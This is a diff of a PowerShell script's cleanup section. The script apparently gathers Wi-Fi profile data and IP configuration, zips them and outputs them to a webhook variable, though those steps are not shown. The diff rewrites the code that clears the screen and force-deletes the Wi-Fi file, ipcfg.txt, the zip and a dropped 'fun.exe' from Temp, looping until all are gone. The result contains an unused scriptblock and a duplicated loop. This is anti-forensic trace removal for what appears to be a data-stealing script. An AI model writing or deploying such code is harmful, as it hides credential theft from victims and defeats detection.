@@ -51,12 +51,37 @@ Write-Output $wh
 # cleanup
 cls
 Start-Sleep -Seconds 3
-Remove-Item -Path "$wifiFile" -Force
-Remove-Item -Path "$e\ipcfg.txt" -Force
-Remove-Item -Path "$zip" -Force
 
-while (Test-Path "$env:LOCALAPPDATA\Temp\fun.exe") {
-    try { Remove-Item -Path "$env:LOCALAPPDATA\Temp\fun.exe" -Force -ErrorAction Stop } catch {}   
+
+$cleanupJob = {
+    param(
+        $wifiFile,
+        $e,
+        $zip
+    )
+
+    while (Test-Path "$env:LOCALAPPDATA\Temp\fun.exe") {
+        try {
+            Remove-Item -Path "$env:LOCALAPPDATA\Temp\fun.exe" -Force -ErrorAction Stop
+            Remove-Item -Path $wifiFile -Force -ErrorAction Stop
+            Remove-Item -Path (Join-Path $e 'ipcfg.txt') -Force -ErrorAction Stop
+            Remove-Item -Path $zip -Force -ErrorAction Stop
+        } catch {
+            # ignore errors
+        }
+
+        Start-Sleep -Seconds 1
+    }
+}
+
+ while (Test-Path "$env:LOCALAPPDATA\Temp\fun.exe") {
+    try {
+        Remove-Item -Path "$env:LOCALAPPDATA\Temp\fun.exe" -Force -ErrorAction Stop
+        Remove-Item -Path $wifiFile -Force -ErrorAction Stop
+        Remove-Item -Path (Join-Path $e 'ipcfg.txt') -Force -ErrorAction Stop
+        Remove-Item -Path $zip -Force -ErrorAction Stop
+    } catch {}
+
     Start-Sleep -Seconds 1
 }
 
